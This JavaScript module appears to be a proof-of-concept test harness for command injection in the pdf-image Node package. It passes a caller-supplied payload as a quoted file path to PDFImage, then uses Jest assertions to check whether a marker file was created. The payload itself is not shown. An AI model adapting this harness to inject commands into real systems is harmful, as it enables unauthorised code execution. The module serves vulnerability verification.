function exploitFunction(payload) {
  const fs = require("fs");
  const path = "./pdf-image_2";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    // Ensure the payload is properly formatted and executed
    let pdfImage = new PDFImage(`"${payload}"`);
    return pdfImage.getInfo().finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlinkSync(path); // Use fs.unlinkSync for simplicity
    });
  } catch (error) {
    console.error(error);
  }
}

module.exports = { exploitFunction };